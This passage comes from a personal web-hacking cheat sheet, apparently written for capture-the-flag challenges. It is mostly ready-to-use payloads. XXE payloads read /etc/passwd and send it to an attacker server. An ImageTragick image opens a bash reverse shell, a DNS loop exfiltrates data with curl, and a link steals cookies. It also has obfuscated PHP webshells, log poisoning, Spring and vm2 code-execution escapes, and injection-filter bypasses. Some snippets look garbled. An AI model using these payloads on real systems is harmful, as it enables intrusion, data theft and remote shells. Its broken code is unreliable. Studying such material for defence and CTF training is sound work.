</Root>
```


### DTD(Document type defination)

There are 2 types of DTD:
* Inline DTD
* External DTD as shown below

DTD is declared Above our XML data and below `<?XML >` inside a `DOCTYPE`.Example
```
=====Internal DTD=====

<?xml version="1.0">
<!DOCTYPE Root [<!ENTITY name "file.txt">] > 


=====external dtd=====

<?xml version="1.0">
<!DOCTYPE Root SYSTEM "external.dtd" > 
```

### Entity inside Entity
```
<?xml version="1.0">
<!DOCTYPE Pwn [
	<!Entity % param_entity "<!Entity name 'aman'>">
	%param_entity;
]> 
<Pwn>
	<p>&name;</p>
</Pwn>
```
So % is a way to declare entity inside entity

## Reason

Taking XML from user and directly parsing it. We can create local/external entity(basically variable) inside a DTD. Example of such DTD would be

External Entity Injection
```
<!DOCTYPE Root [
	<!ENTITY name "file.txt">
	<!ENTITY name1 SYSTEM "/etc/passwd">
	<!ENTITY name2 SYSTEM "file:///etc/passwd">  // ANY FALID URI works like file, gopher, http, ftp, etc
]>

```

## Impact

So this can be used to:
* make a server side request using <ENTITY % ext SYSTEM "http://server.com" > declared inside DTD

## How to find

So there are basically 3 types of it:
* Inband ( XML is parsed and output is directly output on the response)
* Error Based ()
* OOB -out of band/Blind XXE (No ouput)

## Exploiting

**video in vids/xxe.mp4 for Inband and OOB exploitation.**

### Inband
we have direct output here
```
<?xml  version="1.0">
<!DOCTYPE Root [
	<!ENTITY name "file.txt">
	<!ENTITY name1 SYSTEM "/etc/passwd">
	<!ENTITY name2 SYSTEM "file:///etc/passwd">  // ANY FALID URI works like file, gopher, http, ftp, etc
]>
<Root>
	<v1>name</v1>
	<v2>name1</v2>
	<v3>name2</v3>
</Root>
```

### Error Based

Suppose we have the following payload
```
<?xml version="1.0" ?>
<!DOCTYPE message [
	<!ENTITY id SYSTEM "file:///etc/passwd"
]>
<message>&id;</message>
```
__And it errors out saying "error cannot parse or markup error". Basically we are able to read file but cannot get contents because it breaks the XMLParser.__

look onto vids/error_xxe.mp4 for how to get error xxe.



### OOB

We will have to make request to our server to get output(XXE TO SSRF )
```
<?xml  version="1.0">
<!DOCTYPE Root [
	<!ENTITY name SYSTEM "http://IP">
]>
<Root>
	<v>&name;</v>
</Root>
```



**So Here is reading a file from client server and sending its content to our server(We should be able to load external DTD for this ). Here we need ExternalEntity.dtd hosted on our server if not uploaded on clientserver. Explaination in the video.**

> Contents of http://IP/ExternalEntity.dtd
```
<!ENTITY % passwd "/etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'http://IP.com/?%passwd;'> ">
%wrap;
```

> mainExploit.xml
```
<?xml  version="1.0">
<!DOCTYPE data SYSTEM "http://IP/ExternalEntity.dtd">
<data>&send</data>
```



## Smart Attack vectors

### CDATA To avoid bad characters 
Suppose a file.txt contents are as :
```
<pass>password
```

so pyload below wont work because XML try to parse the file loaded and will error out
```
<!ENTITY name SYSTEM "file.txt">
```

So to avoid this we use CDATA which tell xml not to parse whtevers inside it, something like
```
<![CDATA[ TEXT here ]]>
```

So we can do something like
```
<!ENTITY % file SYSTEM "file:///var/html/flag.txt">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;' ">
%wrapper;
```



# Parameter polluting

>Tips
* Always use `%26` instead of `&`

x.php

```
$data = $_POST['data'];
$name = uniqid();

$payload = "data=$data&name=$name";
$post = http_build_query([
    'signature' => hash_hmac('md5', $payload, FLAG),
    'payload' => $payload,
]);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1" . $_SERVER['REQUEST_URI'] . "?action=log");
curl_exec($ch);
```
p.php
```
if (hash_hmac('md5', $_POST['payload'], FLAG) !== $_POST['signature']) {
	echo 'FAIL';
	exit;
}

parse_str($_POST['payload'], $payload);

$target = 'files/' . time() . '.' . substr($payload['name'], -20);
  $contents = $payload['data'];
  $decoded = base64_decode($contents);
  $ext = 'raw';

  if (isset($payload['ext'])) {
    $ext = (
      ( $payload['ext'] == 'j' ) ? 'jpg' :
      ( $payload['ext'] == 'p' ) ? 'php' :
      ( $payload['ext'] == 'r' ) ? 'raw' : 'file'
    );
  }

  if ($decoded !== '') {
    $contents = $decoded;
    $target .= '.' . $ext;
  }

  if (strlen($contents) > 37) {
    echo 'FAIL';
    exit;
  }

  file_put_contents($target, $contents);

```

The vulnerability is on $payload = "data=$data&name=$name";
we can use $data to control $name by `$data: xxx&name=new_name%00`
The NULL byte will truncate the original name.

Now we nee to write a webshell and execute it.
But if $decoded !== '', it will append extension to the filename.

And we know that php's base64_decode() will output empty string if its input doesn't contain any valid character. (valid character include a-z, A-Z, 0-9, +, /, ...)

There are some tips, we can use some arithmetic operation like XOR, NOT, AND, ... to construct the php code.

So if we set data to <?=`something`;&name=z.php%00, the $decoded will be empty and the name can be controled.

The content of the file will not be decoded, it is the original content: <?=`something`;

so payload willbe :
```
data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
```

`~%9c%9e%8b is cat`

so the payload will cat everthing in ../, then write to _ .


# File Uploads

## what is?

Uploading malicious file onto server 

## Reason

* Improper valitation of checking file extension
* using old version converter plugin(imagetragic) to transform/resize file.

## Impact

* If we can run server side code, we get full rce
* stored xss
* CSRF via svg upload


## How to find

* a.'svg
* a."gif
* ``` a.`gif ```
* a.\.gif
* a.png.svg
* file.php.png [yes]
* file.png.php [no]
* file.php;png [yes]
* file.php%00.png [yes]
* file.php.php.png [yes]
* file.png.php.php [no]
* file.php.png123 [yes]
* file.png%00file.php [no]
* file.png' or 1=1# [no]
* file [yes]
* Try `shell.php` , `shell.pHp5` , `shell.php4`,`shell.php4;`,`shell.php4%00` ,`shell.phtml`,`shell.pht` , `shell.pgif` , `shell.phpt`,`shell.shtml`
* filename `<svg/onload=prompt(1)>.png`
* see if flash file can be uploaded
* change Content-Type , upload `shell.png` with php content and intercept request and change content-type from `png` to `php5`
* shell in gif/png files if there is file include

## Exploiting

## Smart Attack vectors

### ImageTragic

Save it as test.jpg and upload it as an image:
```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/IP/8080 0>&1') currentdevice putdeviceprops
```

Another simple payload exploit.png. [ USING DNS query to exfilterate data due to firewall not allowing HTTp]
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl "http://$i.attacker.tld/" -d @- > /dev/null; done`'
pop graphic-context
```

**Look into docx/imagetragic.pdf** for more more detail.

### IE content sniffing

* In IE, and unknown extension like `a.''gif` with content `GIF8;<Script>alert(1);` will be trated as text/HTML .


# LDAP

**These are like sqli just use `*` or `|` or `&` to find it .**
```
http://web.chal.csaw.io:8080
http://web.chal.csaw.io:8080/index.php?search=pete*
so search is like `select * from whtever where (&(name=INPUT)(uid=123))`
so 
http://web.chal.csaw.io:8080/index.php?search=pete*)(uid=123 
will confirm injection of uid
http://web.chal.csaw.io:8080/index.php?search=pete*)(uid=123)(|(uid=*
will inject uid
```

# Command Injection

## what is?

Injecting Shell command 

## Reason

* Bad valitation/filtering of commands

## Impact

RCE

## How to find

* Reading Code
* Fuzzing 

## Exploiting

## Smart Attack vectors

### blackListing [";","&","|"," ","cat"];
```
blackList = [";","&","|"," ","cat"];
userInput = req.get("cmd");
if blacklist.includes(userInput):
	exit("ERROR")
else:
	system("ping -c 4 ".userInput)[:86]; // so even if someone append something, ping's result is whats 									 // output only
```
#### exploits :
* `index.php/?cmd=error%0ac'a't$IFS/etc/flag`
* `index.php/?cmd=$(cat</etc/passed>/tmp/out)`
* `index.php/?cmd=error%0ac'a't$IFS/etc/flag`

> So there is a simple blacklist. so lets see how to solve it 

* Step 1, find the blacklisted characters through fuzzing 
* Now we need to append our command but `&`,`;` and `|` are blocked, so lets see whats are its bypasses
	* `%0a`, `%0A` 
	* `^`
	* `$(cat</etc/passed>/tmp/out)`
	* ``` `ls` ```
	* `%0d`, `%0D`
* Next we need can simply make 'error' in 1st query by `ping error`%0a[nextCommand]
* Now next command cannot have space, so here's tricks to avoid spaces
	* `%0a{cat,/etc/flag}` , the {ls,-l,a,Gh} is a shell feature equivalent to `ls -l a Gh`
	* `%0acat$IFS/etc/flag` , the `$IFS` is shell variable equivalent to space
	* `%0acat${IFS:0:1}/etc/flag`, setting this IFS variable length
	* `%0ad=$'cat\x20/etc/flag'%0a$d` , so `$'\x20'` is translated to space
* Now `cat` is blocked , we can easily use `tail`, `head` etc but cmon we are hackers
	* `c'a't` in shell is equal to cat
	* `c$@at` is again cat
	* `c\a\t`
	* `c"a"t`
	* ***




# OAUTH2

>`/oauth2/authorize` gives you auth token to authorize urself 

```

> curl -X POST --data "response_type=code&redirect_uri=web.chal.csaw.io:9000/oauth2/token" --header "Content-Type: application/x-www-form-urlencoded" web.chal.csaw.io:9000/oauth2/authorize

< Redirecting to <a href="web.chal.csaw.io:9000/oauth2/token?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTI0MTE4LCJleHAiOjE1MzkxMjQ3MTh9.RZJx1tftkU9pEm7-2m1mM-sTaxgJJEwzlP7-rkjhjPU&amp;state=">web.chal.csaw.io:9000/oauth2/token?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTI0MTE4LCJleHAiOjE1MzkxMjQ3MTh9.RZJx1tftkU9pEm7-2m1mM-sTaxgJJEwzlP7-rkjhjPU&amp;state=</a>.


```

>`/oauth2/token` to get the admin token (here code param value is what we get from above request rest all values are usually same)
```
> curl -X POST --data  "grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ3ZWIuY2hhbC5jc2F3LmlvOjkwMDAvb2F1dGgyL3Rva2VuIiwiaWF0IjoxNTM5MTIzNDk2LCJleHAiOjE1MzkxMjQwOTZ9.up2K5DnLBIeO_vPJREaOfG0XvsppUthhcqXcFWacprM&redirect_uri=web.chal.csaw.io:9000/oauth2/token" web.chal.csaw.io:9000/oauth2/token
```
>next just use Authorization: Bearer `response token from /token` and you are admin

* **Redirect URI should be same in both case of /authorize and /token if we can pass different uri, its a bug** <br/>
* **If we are able to use the token twice still a bug**<br/>
* **This redirect uri if point to our url and still gives token is also a vulnerablility**<br/>


### For Facebook login oauth flaw they were not using “state” parameter which used to protect against CSRF attack, so even while adding social account from applications users setting same flawed oauth implementation is used.



# Shellshock

> So if there is cgi-bin/* like cgi-bin/stats  , cgi-bin/netsparker.cgi 

```
curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://site.com/cgi-bin/stats
```

# REGEX bypassing

**Approch**

* use burp intruder to find all the blocked characters ,ex / `site.com/?id=%$$` in intruder and intefer from `1` to `ff`, will make 255 requsest from %00 to %FF finding blocked characters
* now imagine we get blocked `%20` = `space`, `%3b` = `;` , `%26` = `&`, so now make a list of allowed yet dangerous chars,
* so we can send `%00`, `%0a` , `{`,`}`,``` ` ```, `$`,`<`,`>`,`/`,`\`,`,`,`"`,`'` etc
* Now just find the appropriate bypass


```
$cmd = $_GET['c_m_d'];
if(!preg_match('/[a-z0-9]/is', $cmd)){
	system("/sandboxed_bin/".$cmd);
}
```
* Find supported UTF encoding, cuz `a` === `à`, finding unicode can help here.
* `GET  : /?c_m_d[]='ls'` will make cmd as array and bypass check in PHP
* `POST : { c_m_d : ['ls']` with `Content-Type: application/json` in any.
* `GET  : /?c_m_d=???+????.???` will be cat flag.txt and bypass regex

**some command bypasses**

* Try mixing upper+lower case `HtTp` 
* `regex : a.*b` can be bypassed `a%0Ab`

```
$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
if(preg_match($black_list, $_GET['user'])) exit();
if(preg_match($black_list, $_GET['pw'])) exit(); 

$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 

```
* using `\` to bypass next letter. so  `'` is block ,use `\`,i.e `/?user=\&pw=||user/**/REGEXP/**/%22admi%22||%22n%22;%00` ,making this request <br/>
we get `where user='\' and pw='||user REGEXP "admi||n" '` where regexp is mysql feature


# URL's

## `..\Q/\E` in Ruby equals `../`

## Nginx off by slash

**Python's Djano, ruby etc donot have inbuilt static files folder, so ppl put nginx infront of these apps for <br/>
delivering static file .**

**In `nginx` we can define a alias for a location .eg**
```
location /static {
	alias /home/pi/;
}
```
exploit : `127.0.0.1/static../`, so `/static` in route matches `location /static` <br/>
causing to make path=`/home/pi/../` giving us access to 1 directory above

>so how to find this
* http://target.com/asset/app.js  [200 OK]
* http://target.com/asset/		  [403] 
* http://target.com/asset/../setting.py [404]
* http://target.com/asset../ 			[403]
* http://target.com/asset../assets/app.js [200] :O wow but yeah, we might get `alias.com/alias/../assets/app.js`
* http://target.com/asset../setting.py    [200] is file is in above directory else 404?

## javacript:alert

if we can insert links
```
javascript:document.location="http://mysite.com/"+document.cookie
```




# JSP/JAVA


## Template Injecting(SPRING framework)

```
site.com/?q={7*7}

site.com/?q=${T(java.lang.System).getenv()}

site.com/?q=${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
OR
site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
```


# PHP


## PHP-info.php

> What to look for if we get phpinfo.php

* allow-url-encode : true/false
	* tells if php `include` can include remote file via `http` wrapper
* session-save-path : /var/lib/php/session
	* location of saved cookie
* disable_functions
	* tell functions that dont work
	* some function we should look for:
		* system
		* exec
		* shell_exec
		* popen
		* proc_open
		* passthru
		* symlink
		* link
		* syslog
		* imap_open
		* ld
		* mail
		* putenv


## PHP bypass

### `cannot have " or '`

```
> echo pack(C3,112,104,112);
< "php"
```

`$_GET['q'] is preg_match and we cannot have "flag.php" in it`

> Bypass 1

```
> site.com/?q=get_defined_vars()[_GET][X]&X=flag.php
```

### cannot use character 

```
$a = $_GET['a'];
if(preg_match('/^[a-zA-Z0-9]$/'),$a){
  echo "sorry";
}else{
  eval($a);
}
```

> bypass

```
site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
```

* `~` will negate %8C%86%8C%8B%9A%92 tht will produce string "system" , similarly %9C%9E%8B%DF%D5 is `cat *`
* in PHP "system"("ls") is system("ls") and we get answer

### Bypass 2 ** AWESOME PHP Fool **

In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr

```
> site.com/?q=str_rot13(substr(cjq))
```
so no need of `;'",$_` .

## PHP cannot have `_`

**PHP functionality  converts `.` and spaces into `_`, so `site.com/?c.m.d=23` gets converted to "$c_m_d=23" .**

##spaces are not allowed

**Use `+` in query string to bypass space .**

## PHP file_get_content 

**This is super dangerous**

```
$f = $_GET['content'];
file_get_contents($f);
```

Possible values of `$f` are:
* file_get_contents('https://www.evil.com/mydata'); so `$f = https://www.evil.com/mydata`
* `php://input` and "mydata" in POST `so $f=php://input`
* All php wrapper , `php://filter`, `php://fd/0` etc
* `$f = data://text/plain,Hello Challenge! `
* `$f = data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ`


## PHP Assert

**They have code execution**
so if we have 
```
$x=$_GET['key'];
assert($x > 50);
```
so if we put `site.com/?key=printf('flag'); //`

this will execute the command.


## Bypass disasbled functions

Key is LD_PRELOAD + (mail() / imap_open()) functions

## PHP log file injection

```
nc <IP> <port>
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <IP>
Connection: close
```
and include
`?lfi_file=/var/log/apache2/access.log&cmd=<command>`

## shell without valid character

Shell-1: you can execute it like "shell.php?0=system&1=ls"

```
<?
@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
$_=$ 
$_[$__  $__] ;$_[@-_]($_[@! _] );
?>
```

`shell-2: You can execute it like "shell.php?_=system&__=ls"`

```
<?php
$_="{"; 
$_=($_^"<").($_^">;").($_^"/");
?>
<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
```

## PHP dangerous function

* strpos
	* can be bypassed with double Encoding (php 7.0-). Example $x = "%2370hp", and if this $x is used to make furthur request like curl'ed, it will be urldecoded.
* file_get_contents
* md5_file
* file_exists
	* wrapper like http, ftp, file etc works(in old version), in new version also its default off,samba works on windows .(in all file_get_contents,md5 file and file_exists)
* deserialize
	* Can deserialize phar or any serialzed php to execute code
* assert
	* It basically an eval
* htmlspecialchars
	* doesnt encode single quote ' until specified

## PHP eval bypasses

if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads

```
/*
* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
* $payload = "C%5Ei;"; => *
* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
*/

$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";


$decoded_payload = urldecode($payload);
echo $decoded_payload;

```

## PHP Object deserialize


> Trick to instant deserialize `__destruct` 

```
<?
class SHIT{
  public $x = "ls";

  function __destruct(){
    echo `$this->x`;
  }

}

$what = deserialize($_GET['data']);

throw new Exception('Well that was unexpected…');


```
`__destruct` is called by garbage collector and due to `Error`,u will just not get to it.

so actual serialzed data of class SHIT will be:
```
O:4:"SHIT":1:{s:1:"x";s:2:"ls";}
```
but to get pass this, send
```
O:4:"SHIT":1:{s:2:"x";s:2:"ls";}
```
just corrupt the object and walla

## PHP Phar

so here is `makePharFile.php`
```
// create new Phar
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}                 // this is class u can exploit which will deserialize
                                  // this wont be part of ur exploit and this class should have
                                  // __destruct or __wakeup 
$object = new AnyClass; 
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

* Run above file and you will get exploit.phar and upload.
* after upload if there is code with functions
  * include("ourfile")
  * require("ourfile")
  * fopen("ourfile")
  * file_get_contents("ourfile")    <---- can be easily there
  * file("ourfile")         
  * file_exists("ourfile")          <---- can be easily there, i mean whn u upload file they do check
  * md5_file("ourfile")             <---- this can also exist
  * filemtime("ourfile")
  * filesize("ourfile")             <---- this is also comman

so,
```
xxx.com/?file=phar://ourfile
```
Backend : 
```
  $file = $_GET['file'];
  if(file_exists($file)){ <========== exploited

  }
```



I mean yes noone will include, or require file we upload, but file_exists or file_get_contents is comman which will deserialize our payload 





# Node/JS

## Array and text

```
["123"] == "123"
true
```
## http module NN/ is ../

NodeJs `http` module NN bug to make path traversal 

Suppose we have site.com/asdf/ and there is passwd file in site.com/passwd which is not accessible from URL and the following code prevent user going behind the directory to access files, basically ../ is blocked

```
base = "http://site.com"
userInput = req.query.path;
if(path.indexOf("..")==-1){
	http.get(base+userInput);
}
```

Well in NODE a unicode character `NN` is equal to ".." in http Module
thus userInput = 'NN/passwd' bypasses it

Reason is `NN` is basically `\xFF\x2E\xFF\x2E` and `\xFF` is stripped by http maker making it `\x2E`


## sandbox escaping 

we are given an endpoint to run js code in sandboxed environment, `site.com/run?js=console.log(234)` <br/>

* First step is to find what environment we are in, which can be done by throwing error
```
> site.com/run?js=Error().stack
```
```
Error  
    at vm.js:1:1
    at ContextifyScript.Script.runInContext (vm.js:59:29)
    at VM.run (/usr/src/app/node_modules/vm2/lib/main.js:208:72)
    at /usr/src/app/server.js:21:20
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/usr/src/app/node_modules/express/lib/router/index.js:335:12
```
* Second step is find all the functions available to us which can be done printing "this" variable

```
> site.com/run?js=Object.getOwnPropertyNames(this)
```

Now its matter of critical thinking skills to exploit it
* try if public exploits is available
* just use what you have , example bypass of prev version of node's vm module is as:
	```
		"use strict";
		const {VM} = require('vm2');
		const untrusted = `
		var process;
		try{
		Object.defineProperty(Buffer.from(""),"",{
			value:new Proxy({},{
				getPrototypeOf(target){
					if(this.t)
						throw Buffer.from;
					this.t=true;
					return Object.getPrototypeOf(target);
				}
			})
		});
		}catch(e){
			process = e.constructor("return process")();
		}
		process.mainModule.require("child_process").execSync("whoami").toString()
		`;
		try{
			console.log(new VM().run(untrusted));
		}catch(x){
			console.log(x);
		}
	```


## Nosql Injection



# Basics

```
Query 				:	db.accounts.find({username: username, password: password});

Standard query 		:   {“username”: “admin”,“Password”: "admin" } 		: Content-Type: application/x-www-form-urlencoded
Injected query 		:	{“username”: “admin”,“Password”: {'$gt': “”}} 	: Content-Type: application/json 
OR 
INjected query 		:   username=admin&password[%24ne]=''

```




# Enumerating ID's


## MONGO DB

A Uid Provided by mongo on each entry example 5c51b9c9144f813f31a4c0e2 can be Dissected to :
* The first 4 bytes are the seconds since the unix epoch    =>    0x5c51b9c9
* The next 3 bytes are the machine identifier.              =>    0x144f81
* The next 2 bytes are the process id.  				    =>    0x3f31
* The last 3 bytes are the counter value                    =>    0xa4c0e2

> So decrementing the counter sequentially, and decrementing the timestamp Can get us different ID.


# PATTERN in hashes


## COOKIE patter

.asd.asd.asd => python cookie token

asd.asd.asd  => jwt token


## HASH Pattern





